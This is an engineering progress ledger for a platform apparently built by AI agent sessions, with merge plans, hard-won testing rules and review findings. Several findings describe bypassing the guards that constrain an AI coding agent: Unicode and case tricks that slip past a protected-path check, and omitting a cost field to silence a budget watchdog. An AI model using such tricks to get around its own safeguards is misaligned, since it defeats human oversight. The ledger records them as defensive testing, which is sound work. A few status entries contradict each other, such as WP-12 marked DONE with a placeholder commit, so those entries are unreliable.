# PROGRESS — implementation ledger

> Maintained by the orchestrator (docs/technical/14-orchestration-protocol.md). Statuses: TODO · IN_PROGRESS · REVIEW · DONE · BLOCKED. Keep entries short; details go in the WP's notes section below.

## Resume note

> **Session 2, in progress (started 2026-09-09).** Read this, then "Standing rules earned by evidence"
> (thirty-two rules, each with its evidence), then continue the loop in `14-orchestration-protocol.md`.
> `main` is green on all five targets and every finished WP is pushed.

**Fourteen work packages are DONE and pushed.** WP-00 `8852b9e` · WP-01 `dedc4b9` · WP-02 `168d368` ·
WP-02a `8abf247` · WP-03 `ca1ae06` · WP-05 `3397924` · WP-04 `59817d6` · ci-fix `6481b3d` ·
WP-04a `d729616` · WP-06 `d60d770` · **WP-06a `9e0be0b`** · **WP-07 `b036c4c`** · ci-fix(sse) `f1cd8e4` ·
**WP-08 `af206c7`** · **WP-09 `27928b2`**.

**In flight — three worktrees, none merged**

| WP | State | Branch |
|---|---|---|
| WP-12 Claude SDK runner | APPROVED round 3; pre-merge fixes running | `worktree-agent-a80d5d7c411ac0f51` |
| WP-10 Slack | review round 2 running (round 1 found a live mention-injection) | `worktree-agent-a4db5aee16bb73391` |
| WP-11 Sentry + Loki | round 2 fixes running (3 blockers: redactor never wired, pre-redaction read, byte cap defeated) | `worktree-agent-ab12848be4b2009b2` |

**Merge in this order, and the order matters**

1. **WP-12 first** — it is approved and touches nothing the others touch.
2. **WP-10 second.**
3. **WP-11 last**, because it makes the redactor **required** on `ProviderCreateInput` (rule 31). That is a
   shared type: `jira-cloud` and `gitlab` are already on `main` and WP-11 carries their updates, but
   **Slack's registration will also need to supply it**, and WP-10 cannot know that. WP-11's report states
   exactly what a fourth provider must pass; apply it to Slack at the merge and re-run all five targets.

**OPEN-QUESTIONS numbering** — `main` has **Q40** (WP-09). WP-12 carries **Q41** (renumbered by the
orchestrator when `main` was merged in; the collision conflicted on the same hunk, as designed). WP-10 took
**Q42**. WP-11 took **Q41** and must be renumbered to **Q43** at merge. Highest migration is `0011_auth.sql`.

**Then continue the plan.** WP-13 (run shim) needs WP-12. WP-15 (pipeline interpreter) needs WP-04…WP-12 and
is where everything is first exercised together — its ledger obligations are in "Notes WP-15 must honour" and
"Obligations WP-15 and WP-19 must honour". **WP-20** (web app) needs only WP-06 and is parallel-safe with
everything above; it is the obvious next thing to start alongside WP-13.

**Merge recipe**: `git merge main` into the WP branch → verify → `git merge --squash <branch>` on `main` →
`pnpm install` → all five targets **on main** → resolve conflicts (`pnpm-lock.yaml` by regeneration, both
`index.ts` files as unions, `.env.example`, `docs/OPEN-QUESTIONS.md` by renumbering, and
`docs/technical/PROGRESS.md`, which is orchestrator-owned so take your own side) → commit → push → delete
branch and worktree. Green in a worktree is not green on `main`: this session proved it three times.

**Orchestrator hygiene learned the hard way (rule 25).** Never use a busy-loop load generator without
`trap 'kill 0' EXIT INT TERM`, and never `2>/dev/null` on a cleanup step. Forty-eight orphaned spinners
starved this machine at load average 137 for 4 h 37 m and stalled a reviewer for 4 h 50 m before another
session on the host found and killed them.

## Environment (orchestrator shell, verified 2026-09-09)

| Tool | Version / status |
|---|---|
| OS | macOS (darwin 25.6.0), arm64 |
| git | 2.50.1 · remote `git@github.com:gtfo-ai/platform.git` (ssh), branch `main`, clean |
| gh | 2.86.0 · authenticated as `JanMikes`, scopes `repo, read:org, gist, admin:public_key` — push access OK |
| Node | **25.1.0** on PATH (`/opt/homebrew/bin/node`); Node **24.3.0** at `/opt/homebrew/Cellar/node/24.3.0/bin` — note `/opt/homebrew/opt/node@24` is a **broken symlink** to Cellar/node/25.1.0, corrected at WP-01 |
| pnpm | 12.3.4 (installed globally by the orchestrator during start-up) |
| Docker | server 29.4.1, linux/aarch64 — running |
| gitleaks | **not installed** on the host — must be provided by the repo (npm devDependency or Docker) in WP-00 |
| lefthook | **not installed** on the host — must be an npm devDependency in WP-00 |

**Decision (orchestrator, start-up):** `engines.node` is `>=24` (not `=24`) so the local Node 25 toolchain works; CI pins Node 24 via `.nvmrc`/setup-node. If a dependency breaks on Node 25 locally, prefix commands with `PATH=/opt/homebrew/Cellar/node/24.3.0/bin:$PATH` (verified to run `verify` green at WP-01).

## Standing rules earned by evidence

Each of these cost at least one review round to learn; all are evidenced in the notes below.

1. **A fake may be stricter than the real adapter, never kinder.** Every later WP's unit tier trusts the
   fake, so one that admits what production blocks, or fires earlier than production, launders a bug into a
   pass. Four such divergences were found in the pg-boss fake alone, three in the dangerous direction. Write
   every deliberate difference down where the fake is defined.
2. **A wall-clock assertion is a hardware assertion, not a correctness one.** CI is a 2-core runner. Property
   tests carry `PROPERTY_TEST_TIMEOUT_MS` (30s) and a pinned `MODEL_RUNS`.
3. **An invariant asserted in a comment, an error message or `.env.example` is not evidence it holds** — and
   a test that would pass whether or not the behaviour is present is not a test of it. **Mutation-check every
   guard**: reverting it must fail its test, by a named assertion rather than a timeout.
4. **When a defect keeps returning one layer down, stop fixing the code and audit the instrument.** Ask of
   every fake: is it kinder than the real thing, and can it even *reach* the state my assertion is about? A
   positive assertion fails loudly on a broken harness; a negative one passes silently on the same wreckage.
5. **A differential result is evidence about the corpus, not the program**, and whoever built the corpus is
   the worst judge of what it omits. Two independent corpora disagreed by 3,624 verdicts.
6. **Green in a worktree is not green on `main`.** Re-run all five targets after every merge, before writing
   the commit. Watch for a WP adding a *required* field to a shared type, or a runtime invariant that will
   not fail typecheck at all.
7. **A guard with a hand-maintained scope drifts.** Ask git what it tracks; do not carry your own list.
   Corollary earned at WP-06a round 2: *fixing a hand-maintained list by adding a second hand-maintained
   list does not discharge this rule* — `check-ignored.mjs` closed its missing-root gap by adding
   `IGNORABLE_ROOT_FILES`, an **allow-list that suppresses failures**, so its drift is silent and in the
   dangerous direction.
8. **Docs win over code.** When implementation proves a doc wrong, amend the doc first, then point at it.
   TD-004, technical/02, technical/03, technical/12, BD-007 and product/04 were all amended this way.
9. **An obligation two paths can each discharge needs an explicit arbiter — and the rule has two
   directions.** *Over*-discharge is the sixth layer of the WP-06a defect: two paths each correctly writing
   "the client has been told" is not two correct paths, it is an unsynchronised shared flag with no flag.
   Its **dual is a distinct class that the first half would not catch**: an arbiter *consumed* by a path
   that did not perform the obligation, so nobody discharges it — WP-06a's `retry:` was suppressed by the
   `first` flag being spent on frames the `partials` filter had already dropped. State both directions.
10. **A test whose assertion is satisfied by every branch must also assert which branch ran**, or it certifies
   the observable and not the code. `hub.test.ts:817` asserted `shutdown@-` last — true down either route —
   and never asserted the `reset` that only one route writes.
11. **A register entry that justifies a kindness by pointing at a test elsewhere must name a test that
   exists.** All five WP-07 fakes justified "no quota unless scripted" with "the scripted path is what the
   executor's tests drive"; nothing anywhere composed a fake with the executor. A justification is a claim
   about the suite, and claims about the suite are checkable.
12. **A fake's kindest divergence needs a positive assertion, not a warning.** Documenting a divergence is
   necessary and not sufficient: the place a fake is most permissive is the place a later WP leans hardest.
   Hard-coding `mergeable: true` in the WP-07 git fake passed 39/39 unit and contract tests.
13. **A redactor is only as good as the consumer that serialises what it missed, so review it against the
   real serialiser.** WP-07's `redactErrorInPlace` was verified against `pino-std-serializers@7.1.0`'s
   actual `lib/err.js` and leaked four ways: own enumerable fields (`err.js:29-38` copies every `for…in`
   key), `AggregateError.errors[]` (`err.js:24-26`), and any `cause` chain past its own depth bound —
   because pino's `messageWithCauses` walks the chain **unbounded**. *A bound the consumer does not share
   is not a safety property.*
14. **A guard enforced only by TypeScript is not enforced at a boundary.** WP-07's shadow guard was made
   required in the type and probed live: a JavaScript caller omitting `mode`, or passing `'SHADOW'` for
   `'shadow'`, got `status: ok` and a **real** provider call. A mutation that dies as `TS2578` proves the
   compiler, not the code — mutation-check a runtime guard from JavaScript.
15. **A guard that matches paths as strings inherits the filesystem's equivalence classes, not its own.**
   Case and unicode normalisation decide whether a protected path is protected. WP-12's path guard returned
   `allow` for `.ENV` against a `.env` rule, and the reviewer wrote `.ENV` on APFS and **overwrote `.env`**.
   Case-folding costs a false deny on a genuinely case-sensitive filesystem, which is the fail-closed
   direction, so take it.
27. **Measure a prescribed fix before applying it — three times this session a reviewer's or orchestrator's
   proposed patch was wrong, and each time the implementer who measured it caught something.** WP-06a: the
   proposed `#queued >= cap + replayOutstanding` was *algebraically identical* to the broken gate and closed
   at the same frame. WP-06a round 2: the proposed arbitration flag closed only one direction, and had to be
   claimed before `abandon()`'s `reset`s rather than before its `shutdown`. WP-12 round 3: the prescribed
   whole-string `NFKC` fold maps **U+FF0F to `/`**, which the volume does not — so `src/*.ts` would have
   answered `allow` for `src/a／b.ts`, turning a fail-closed widening into a fail-**open** one. Per-segment
   folding pins it. *A fix arriving with authority is still a hypothesis.*
26. **`toLowerCase()` is lowercase *mapping*; a filesystem compares with full case *folding* — and the way
   to learn its equivalence classes is to ask it, not to reason about Unicode.** WP-12's round-1 fix folded
   with `normalize('NFC').toLowerCase()`; the reviewer wrote `conﬁg/app.yaml` (U+FB01) on APFS and it
   **overwrote `config/app.yaml`** — same inode — while the guard returned `allow`. Same for `ſecrets`
   (U+017F), `ſrc`, and `aßets` (`straße` ≡ `strasse`, same inode). The fix is `NFKC` plus an explicit
   `ß → ss`; both only widen, so both fail closed. **The instrument is the transferable part:** a
   filesystem-differential test that creates the files and compares inodes cannot drift from the filesystem
   the way an argument about Unicode can. Sharpens rule 15.
   **Sharpened again at round 3: do not reason about the classes, *enumerate* them — and then accept that a
   string fold can only ever approximate a filesystem's.** Writing every code point into one directory and
   grouping by inode found **1906 equivalence classes** across the BMP and plane 1, and named the **43** the
   fix still misses. Reasoning had found four. But the census also found the *cause*, which is worth more
   than the list: `toLowerCase()` reads the case table of the running **Node/ICU** build, while the volume
   compares with the case table baked into **the OS release**, and those version independently. Every miss is
   a recently-encoded cased letter (U+A7CF/D3/D5; the contiguous plane-1 run U+16EBB–U+16ED3), so the gap
   **re-opens on every Node or macOS Unicode bump, in whichever direction is ahead** — a hard-coded table of
   the 43 would be stale by the next one. *State the guarantee over the classes that fold onto an **ASCII**
   name*, which is what a protected-path list is written in (every example in technical/12 and the shipped
   `FLAGGED_CONFIG_PATHS`) and which the census confirms holds without exception; treat anything wider as
   best-effort and expect it to drift. All 43 misses are non-ASCII↔non-ASCII, so the ASCII guarantee is
   provably complete on this volume.
29. **A counter a suite uses to decide which branch ran must itself be proved live.** WP-10 added
   `providerCalls()` to the shared suite precisely to fix a rule-10 failure — and mutating the harness to
   `providerCalls: () => 0` left **2335 of 2335 tests green**, because the suite only asserted the counter
   *had not moved*. Capture a baseline, assert it increased, and only then assert it did not increase again.
   This is rule 10 one level up, and it bit the fix for rule 10.
31. **An optional security dependency is an absent one.** WP-11's providers take a `redactor` as an
   optional option and `ProviderCreateInput` has no field for one, so in the **only production path**
   `redact.apply` is the identity function — a scripted Loki response returned
   `line = "Authorization: Bearer <token>"` verbatim, and the executor does not close it (`action-executor.ts:663`
   returns the raw `result`; only the audit row is redacted). WP-07 had already made its own redactor
   **required, never defaulted**, for exactly this reason; WP-11 reintroduced the defect one ring out. If a
   guarantee needs an injected collaborator, the type must **require** it, and the composition root that
   builds it in production must be the thing the tests drive.
33. **A guard shipped as a `scripts/*.mjs` verify step has no test tier of its own, so mutating the guard
   passes the whole suite.** Changing WP-10's NUL guard from `indexOf(0)` to `indexOf(0, 1)` — blind to a
   NUL at byte 0 — left **all 2353 tests green**. Manual canaries are evidence that expires when the session
   does. `scripts/check-ignored.test.ts` is the precedent: give every executable guard a real test.
34. **Adding a step to `verify` is not adding it to CI.** The two lists are maintained separately and have
   drifted: `ignored:check` — a guard that has already caught two live defects — has run in **no CI job**
   since it was written. Rule 7's shape at the level of the pipeline: derive one list from the other, or
   fail when they differ.
32. **"I checked and it is benign" is a claim that needs the same evidence as a fix.** WP-11 reported a
   surviving `BigInt` → `Number` mutation as harmless and narrowed its docblock instead of the code; the
   orchestrator relayed that as good practice. The reviewer measured it: `Number` diverges for **128 of every
   1e6** nanosecond values (`1780309799999999872` → `…59.999Z`, not `…00.000Z`), and that value **is** the
   emitted `timestamp` and the sort key. Narrowing a claim is honest only when the claim is what was wrong.
30. **A lesson recorded only in prose does not prevent recurrence — when a defect is mechanically
   detectable, add the check.** The ledger's WP-05 entry on a literal NUL byte turning a source file binary
   ends *"worth a lint rule if it ever recurs."* It recurred, in WP-10's `threads.ts`, five work packages
   later: `Bin 0 -> 3808`, invisible in `git diff`, in `git log -p` and in review. Writing it down was not
   enough; the check now runs in `verify`.
28. **A fold that may widen equality must never widen structure.** WP-12's fold is allowed to make more
   paths match a protected pattern — that direction is safe. It is *not* allowed to invent a path
   separator: NFKC maps U+FF0F, and also `℀` U+2100, `℁` U+2101, `℅` U+2105 and `℆` U+2106, into strings
   containing `/`, which would split a filename into two segments and make `src/*.ts` answer **allow** for
   `src/a／b.ts`. Pin every separator the fold can create, and fold per segment rather than over the whole
   string.
16. **A guard against an untrusted producer must not read a field that producer can omit.** A missing number
   is not zero, and `NaN` compares false against every ceiling. Deleting `total_cost_usd` from WP-12's
   `result` line left the budget watchdog silent at `NaN > 0.01`, the run `completed`, and `NaN` flowing to
   the cost ledger. "The vendor enforces it" is a claim about a binary the platform ships and does not
   control.
17. **A provenance label is a claim about the corpus, and an unasserted claim drifts.** WP-08's fixtures
   carry a `source` block naming a vendor documentation URL and a retrieval date; the reviewer rewrote one
   to `kind: documented` with `url: https://example.invalid` and **157 of 157 tests passed**. Fixture
   provenance needs a test, or it is decoration — and the test must be honest about what it cannot check
   (that the vendor's page still says the same thing).
18. **An empty credential is not a credential.** WP-08's webhook verifier accepted
   `HMAC-SHA256('', body)` — a signature any attacker can compute — because an unset secret produced an
   empty string rather than a refusal. Every configuration value whose empty or absent case silently
   produces a *permissive* result is this defect.
19. **A minted credential must carry its own revocation address.** WP-09 minted against
   `request.project` and revoked against `config.project`; the mismatched DELETE 404s, the idempotency that
   "absorbs the 404 of a second revocation" swallows it, and the caller is told the token is revoked while
   it lives until midnight UTC. *Idempotent error-absorption is indistinguishable from the wrong address* —
   whenever a guard absorbs a not-found, ask which not-found it is absorbing.
20. **Fail closed on a mutation; fail open on an inbound notification.** WP-09's `mapPipelineStatus` threw
   on an unknown status inside `normalise`, so a status GitLab adds later turns every such delivery into a
   permanently failing job. Refusing an enum value you do not recognise is right when you are about to
   *act*; when you are being *told* something, it turns a vendor's new feature into a stuck queue.
21. **A mutation harness must be canaried before it is believed, and `--reporter=basic` has now lied in
   both directions.** In vitest 5 that flag does not exist: WP-12's harness read it as *"no test failed"*
   and called every mutant **alive**; WP-09's produced a runner error with **exit code 1**, so a harness
   trusting exit codes would have called every mutant **dead**. Plant a deliberate failure first and watch
   the harness report it — a mutation result is a measurement, and an uncalibrated instrument reads
   whatever you were hoping for.
22. **A layered guard whose outer layer is complete is unreachable, and therefore untested by
   construction.** WP-08's unrequested-marker refusal passes 82 unit and 175 contract tests because nothing
   can drive it — the guard in front of it never lets the state occur. Give the inner layer a seam, or say
   at the line that it is deliberately unreachable defence-in-depth and name the outer guard that makes it
   so; an untestable branch that looks tested is standing rule 3 with better manners.
23. **A new port obligation must land in the shared contract suite in the same change, or it is a
   provider-local promise.** WP-09 taught the git fake and its own contract file that a foreign credential
   handle must yield `not_found` — and left `git-provider-contract-suite.ts` untouched, so a future GitHub
   adapter that silently `return`s for a foreign handle passes the entire shared suite. BD-017's whole claim
   is that a new provider is trustworthy without touching the pipeline; only the suite can make that true.
25. **A load generator needs a cleanup that survives its own parent — and never silence the cleanup.**
   The orchestrator reproduced the WP-06a flake with `for i in $(seq 1 24); do (while :; do :; done) & done`
   and cleaned up with `kill $LOADPIDS 2>/dev/null`. In zsh an unquoted variable does **not** word-split, so
   `kill` received one newline-joined argument and failed — and `2>/dev/null` hid it. Run twice, that leaked
   **48 orphaned spinners** which were reparented to launchd and ran for 4 h 37 m at a combined ~1300 % CPU,
   load average 137, starving the machine (a *different* Claude session on the same host diagnosed and killed
   them). The recipe that works: `trap 'kill 0' EXIT INT TERM` at the top so the whole process group dies with
   the script, a bounded generator (`timeout 60 …`) rather than `while :`, and **no `2>/dev/null` on a cleanup
   step** — the one command whose failure you must not miss.
   *Nothing was invalidated:* every verification after the leak ran at load ~137 and passed, and passing under
   heavy load is a stronger result than passing idle; the reviewers' timing bounds inflate under load, so a
   satisfied bound stays conservative. But two readings were wrong — `verify` durations climbing from 2.7 s to
   16 s were attributed entirely to the growing suite when part of it was the leak, and the `ci-fix` commit
   `f1cd8e4` says "0 out of 8 under the same load" when the post-fix pass in fact ran under **48** spinners
   against the pre-fix pass's 24. Heavier, not equal; the conclusion holds, the sentence does not.
24. **A check that counts execution is not a check that counts assertion.** WP-09's unexercised-fixture
   check survives an unreferenced interaction and a `.skip`ped test — but deleting all three `expect`s from
   a test while keeping its calls passes 32/32. Mutate the assertions, not only the fixtures.

## Blocker briefs needing a human

(none)

## Milestone M1 — the loop

| WP | Title | Depends | Parallel-safe | Status | Commit | Notes |
|---|---|---|---|---|---|---|
| WP-00 | Repo scaffold | — | no | DONE | `8852b9e` | 3 review rounds; notes below |
| WP-01 | `packages/contracts` | WP-00 | no | DONE | `dedc4b9` | APPROVE; 5 hardening fixes folded in |
| WP-02 | `packages/domain` | WP-01 | no | DONE | `168d368` | 3 rounds spent; 2 command-policy defects carried to WP-02a |
| WP-02a | Command policy: close the two `allow` routes found at WP-02 round 3 | WP-02 | no | DONE | `8abf247` | 2 rounds; includes the property-test ci-fix |
| WP-04a | Delete the `DrainScheduler` seam; `OutboxWorker` owns its timer | WP-04, WP-05 | no | DONE | `d729616` | TD-004 amended |
| WP-03 | Postgres schema + Drizzle + migrations (technical/03) | WP-00 | no | DONE | `ca1ae06` | 2 review rounds; 2 privilege escalations found and closed |
| WP-04 | Event store + priority dispatcher + outbox job (TD-005) | WP-02, WP-03 | no | DONE | `59817d6` | 3 rounds; every guard mutation-checked |
| WP-05 | Jobs port on pg-boss | WP-03 | no | DONE | `3397924` | 3 rounds; Q38; fake divergence register |
| WP-06 | Fastify server skeleton (TD-002) | WP-04 | no | DONE | `d60d770` | 3 rounds; SSE write-chain defect carried to WP-06a |
| WP-06a | SSE: replay and live frames share the write chain; and the test harness cannot see it | WP-06 | no | DONE | `9e0be0b` | 3 review rounds + a follow-up; **seven** layers of one defect; unblocks WP-12/WP-15 |
| WP-07 | Integration ports + fakes + contract test suites | WP-04 | no | DONE | `b036c4c` | 2 review rounds + a pre-merge fix round; rules 11-14 earned here; unblocks WP-08…WP-11 |
| WP-08 | Jira Cloud provider | WP-07 | yes | DONE | `af206c7` | 2 review rounds + pre-merge fixes; rules 17, 18, 22; shared fixture-provenance suite lives here |
| WP-09 | GitLab provider (gitlab.com + self-managed) | WP-07 | yes | DONE | `27928b2` | 2 review rounds + pre-merge fixes; rules 19, 20, 21, 23, 24; **Q40** is its open question |
| WP-10 | Slack provider | WP-07 | yes | REVIEW | branch `worktree-agent-a4db5aee16bb73391` | APPROVED round 2; pre-merge fixes running; rules 29, 30 earned here |
| WP-11 | Sentry + Loki providers | WP-07 | yes | REVIEW | branch `worktree-agent-ab12848be4b2009b2` `786ac46` | +218 tests; 29 mutations; review round 1 running |
| WP-12 | Claude SDK runner (technical/04) | WP-04, WP-05 | no | DONE | `WP12SHA` | 3 review rounds + pre-merge; rules 15, 16, 26, 27, 28; **Q41**; unblocks WP-13 |
| WP-13 | Run shim `agentic-runlet` (TD-025) | WP-12 | no | TODO | — | |
| WP-14 | Launcher service + `WorkspaceProvider` (docker + fake) | WP-13 | no | TODO | — | |
| WP-15 | Pipeline interpreter + stage executor + sagas (technical/02) | WP-04…WP-12 | no | TODO | — | |
| WP-16 | Context packs + KB indexer (phase 1 FTS) + code map (ctags + PageRank) | WP-03, WP-12 | no | TODO | — | |
| WP-17 | Role prompts + artifact schemas + eval sets (product/13, TD-016) | WP-12 | yes | TODO | — | |
| WP-18 | Librarian pipeline + proposals + apply policy + knowledge MR flow + ni | WP-16, WP-17 | no | TODO | — | |
| WP-19 | Cost ledger, rollups, budgets projection, price table maintenance job, | WP-04 | no | TODO | — | |
| WP-20 | Web app foundation (TD-013) | WP-06 | yes | TODO | — | |
| WP-21 | Onboarding wizard steps 1–5 incl. discovery agent and readiness evalua | WP-16, WP-17, WP-20 | no | TODO | — | |
| WP-22 | Docker images (base, runtime, launcher, product), Compose (profiles `l | WP-14 | no | TODO | — | |
| WP-23 | Docs | WP-22 | yes | TODO | — | |

## Milestone M2 — trust

| WP | Title | Status | Commit | Notes |
|---|---|---|---|---|
| WP-24 | review-only mode | TODO | — | |
| WP-25 | ticket readiness linter | TODO | — | |
| WP-26 | rebase gate + conflict warnings | TODO | — | |
| WP-27 | steer + take-over/hand-back (export, resume instructions) | TODO | — | |
| WP-28 | cost estimate + budget approval | TODO | — | |
| WP-29 | human time accounting | TODO | — | |
| WP-30 | autonomy dial + wizard step 4 + settings mirror | TODO | — | |
| WP-31 | ask-the-task | TODO | — | |
| WP-32 | digest + quiet hours | TODO | — | |
| WP-33 | nightly real-LLM smoke + evals in CI (`llm-ci` environment). | TODO | — | |

## Milestone M3 — show the value

| WP | Title | Status | Commit | Notes |
|---|---|---|---|---|
| WP-34 | shadow mode (closed tickets) + ShadowReport + UI | TODO | — | |
| WP-35 | history bootstrap | TODO | — | |
| WP-36 | maintenance pipeline | TODO | — | |
| WP-37 | risk classes + reviewer routing (CODEOWNERS) | TODO | — | |
| WP-38 | dependency policy + Checks panel (licence/maintenance status) | TODO | — | |
| WP-39 | coverage delta | TODO | — | |
| WP-40 | epic split (spike variant) | TODO | — | |
| WP-41 | statistics deep-dive (readiness attribution, clean-first-MR rate, estimate accuracy) | TODO | — | |
| WP-42 | release 0.1.0 (release-please, changelog, migration notes). | TODO | — | |

## WP notes (decisions, assumptions, reviewer findings)

### WP-00

**Blocking environment finding — the verification contract's literal command does not parse.**
`pnpm -s verify` fails on pnpm 12 with `error: unexpected argument '-s' found`: pnpm 12's CLI
accepts `-s` only for a real subcommand, and the implicit "run this script" shorthand rejects
preceding global flags. Working equivalents, all implemented and green:
`pnpm run -s verify` · `pnpm -s run verify` · `pnpm verify`.
The same applies to `verify:integration`, `verify:e2e`, `verify:ui`.
`docs/technical/14-orchestration-protocol.md` § "Verification script contract" and the orchestrator
loop should be updated to `pnpm run -s verify` (docs are the orchestrator's to change, not the
implementer's).

Decisions and assumptions:
- **Package scope `@platform/*`** (BD-014). Root package `platform`; nothing carries the product
  name. Renaming later is a scope search-and-replace plus the display constant.
- **No build step yet.** Workspace packages export `./src/index.ts` directly
  (`module: preserve`, `moduleResolution: bundler`, `noEmit: true` everywhere). The emit strategy
  (tsc emit vs bundler) is decided when the first runnable app lands (WP-06). Relative imports are
  written with `.js` extensions because that is what a future `tsc` ESM emit will require —
  nothing enforces it under `moduleResolution: bundler`, and it does *not* make sources runnable
  under Node's type stripping (verified on Node 25.1.0: `import './b.js'` from a `.ts` file throws
  `ERR_MODULE_NOT_FOUND`; stripping needs the on-disk `.ts` specifier).
- **TypeScript 7.0.2** (current stable; 6.x never shipped stable). `strict` plus
  `noUncheckedIndexedAccess`, `noImplicitOverride`, `noFallthroughCasesInSwitch`,
  `noImplicitReturns`, `noUnusedLocals/Parameters`, `verbatimModuleSyntax`.
  `exactOptionalPropertyTypes` deliberately left **off** — it is not part of `strict` and it fights
  zod-inferred types; revisit in WP-01 if contracts tolerate it.
- **Whole-repo typecheck is one program** (`tsconfig.json`), so its `lib` includes DOM. Per-package
  `tsconfig.json` files keep the boundary honest for editors: only `apps/web` gets DOM. Project
  references were left out (the plan marks them optional).
- **Vitest 5 projects** = `unit`, `contract`, `integration`, `e2e-fake-claude`, `ui`; tier chosen by
  file name (`*.contract.test.ts`, `*.integration.test.ts`, `*.e2e.test.ts`, anything under
  `apps/web/src` is `ui`). Coverage thresholds from technical/10 are wired and *proven* to fail when
  breached (80 % overall, 90/85/90 on `packages/domain/src/**`).
- **gitleaks ships as the `@b12k/gitleaks` devDependency** (MIT wrapper, pinned to gitleaks 8.30.1,
  verifies the upstream checksum). `scripts/gitleaks.mjs` falls back to a `gitleaks` on PATH, then to
  `ghcr.io/gitleaks/gitleaks` pinned by digest via Docker, then fails closed (`--require`/`CI`) or
  prints a loud warning. pnpm 12 blocks post-install
  scripts by default: the allowlist lives in `pnpm-workspace.yaml` under `allowBuilds` (not
  `onlyBuiltDependencies`, which pnpm 12 ignores).
- **Hooks call local binaries directly**, not `pnpm exec` — `pnpm exec` triggers an implicit install
  check on every hook run.
- **CI is a single `ci.yml`** with jobs lint · typecheck · unit+contract · ui · integration · e2e ·
  secret-scan · commitlint · dco, as WP-00 asks. Splitting into the separate workflow files listed in
  technical/11 (`integration.yml`, `secrets-scan.yml`, `dco.yml`, `image.yml`, …) is left to the WPs
  that need them. DCO is a plain `git rev-list` + trailer check, so no third-party action to pin.
- **`pnpm dev` and `pnpm schemas` are stubs** that print what they are waiting for and exit 0
  (WP-06/WP-20 and WP-01 respectively).

Evidence:
- `pnpm run -s verify` · `verify:integration` · `verify:e2e` · `verify:ui` — all exit 0, each with a
  single final `PASS: <target>` line; the FAIL path was proven with a deliberate type error.
- Pre-commit hook proven to block: a planted `glpat-…` fake token staged in a throwaway repo using
  this repo's `lefthook.yml` and `.gitleaks.toml` → `leaks found: 2`, hook exit 1. Artefacts deleted;
  `grep` confirms no planted value anywhere in the tree.
- `gitleaks dir .` and `gitleaks git --log-opts=--all` (5 commits) — no leaks.
- `actionlint` (Docker) on `.github/workflows/ci.yml` — 0 errors.

### WP-00 — reviewer round 1 (REQUEST_CHANGES, 2026-09-09)

Blocking:
1. `README.md`, `CONTRIBUTING.md`, `CLAUDE.md`, `.github/PULL_REQUEST_TEMPLATE.md` document `pnpm -s verify`, which pnpm 12.3.4 rejects (`unexpected argument '-s' found`). Must be `pnpm run -s <target>` — the protocol doc was already corrected by the orchestrator.
2. `scripts/gitleaks.mjs` exits 0 when neither a binary nor Docker is available, and that is the only step of the CI `secret-scan` job → a scan that cannot run reports success. Fail-open contradicts BD-002; must fail closed in CI.
3. `CLAUDE.md` claims `.js` extensions keep sources runnable under Node type stripping — false on Node 25 (stripping needs the on-disk `.ts` specifier). Keep the convention, fix the stated reason.

Non-blocking (recorded, fixed opportunistically): `NO_UPDATE_NOTIFIER=1` for `@b12k/gitleaks` (its `update-notifier` chain reads `~/.npmrc` tokens); Docker fallback tag-pinned not digest-pinned and uses the legacy `zricethezav/gitleaks` image instead of `ghcr.io/gitleaks/gitleaks`; `.gitleaks.toml` allowlists `pnpm-lock.yaml` wholesale and exempts any line containing "example"; no import-boundary lint yet (add at WP-01/02 when the first cross-package import lands); `.env.example` omits `APP_FEATURE_*` from technical/12.

### WP-00 — round 2 (implementer response to review round 1)

All three blocking findings and non-blocking 4–7 fixed; the import-boundary lint is deferred as
agreed (no cross-package import exists yet).

1. **Invocation form.** `pnpm run -s <target>` everywhere in `README.md`, `CONTRIBUTING.md`,
   `CLAUDE.md`, `.github/PULL_REQUEST_TEMPLATE.md`; also normalised `pnpm -s run X` → `pnpm run -s X`
   in `.github/workflows/ci.yml` and the `scripts/verify.mjs` header. Tree grep is clean apart from
   `PROGRESS.md`, the protocol doc (both describe the broken form deliberately) and
   **`.claude/agents/{implementer,reviewer}.md`, which still say `pnpm -s verify` on three lines**.
   Those are subagent definitions — harness configuration — so the implementer did not edit them;
   the orchestrator should. Until then every implementer and reviewer is told to run a command that
   errors out.
2. **Secret scan fails closed.** `scripts/gitleaks.mjs` now exits non-zero whenever the scan could
   not run and `--require` was passed or `CI` is set. The pre-commit job and the new
   `secrets:scan:ci` script (used by `ci.yml`) both pass `--require`. `GITLEAKS_SKIP=1` is the only
   way past it locally, it prints a loud banner, and CI ignores it. Manual `pnpm secrets:scan`
   keeps the friendly warn-and-exit-0 behaviour.
3. **`.js` extension rationale corrected** in `CLAUDE.md` and above: it is what a future `tsc` ESM
   emit will require, nothing enforces it under `moduleResolution: bundler`, and it does *not* make
   sources runnable under Node's type stripping.
4. `NO_UPDATE_NOTIFIER: '1'` in every child environment the script spawns (including the probes).
5. Docker fallback is `ghcr.io/gitleaks/gitleaks@sha256:c00b6bd0…bbb7f` (v8.30.1 multi-arch index
   digest), run with `--network=none` and a read-only mount. (Round 2 briefly dropped
   `--network=none` on the false premise that it blocks the pull — the daemon pulls over the host
   network; the flag only affects the container namespace. Restored in round 3.)
6. `.gitleaks.toml`: the blanket `[allowlist] paths` block is **gone entirely** — both scans pass
   without it. The fixture rule's exemption is now the single regex `FAKE`, the marker BD-002
   actually prescribes.
7. `.env.example` gained `APP_FEATURE_TICKET_LINTER|REVIEW_ONLY|MAINTENANCE|SHADOW_MODE|DIGEST`.

Round-2 evidence:
- `pnpm run -s verify` · `verify:integration` · `verify:e2e` · `verify:ui` — all exit 0.
- Fail-closed proof, binary and Docker both unreachable (`PATH=/usr/bin:/bin`, script copied to a
  directory with no `node_modules`): `CI=1` → exit 1; `--require` → exit 1;
  `CI=1 GITLEAKS_SKIP=1 --require` → exit 1 (opt-out ignored in CI);
  `GITLEAKS_SKIP=1 --require` → exit 0 with the banner; no flags → exit 0 with the warning.
- Docker fallback exercised on the pinned digest: planted `glpat-…` → `leaks found: 2`, exit 1;
  clean tree → exit 0.
- Pre-commit re-proven with the final `--require` config: planted secret → exit 1, clean → exit 0.
- `pnpm secrets:scan` and `secrets:scan:ci` (full history) — no leaks. `actionlint` — 0 errors.

### WP-01 — `packages/contracts` (APPROVE, round 1)

Reviewer confirmed doc fidelity: all 49 events in technical/02's catalogue present with exact names and
no inventions; technical/12's config example transcribed key-for-key and parsing; all nine artifact
`data` shapes field-for-field; technical/08 and /04 sampled and matching. `z.strictObject` everywhere —
no `z.object(`, `catchall`, `passthrough`, `any` or `unknown` in the package; every `z.record` is one of
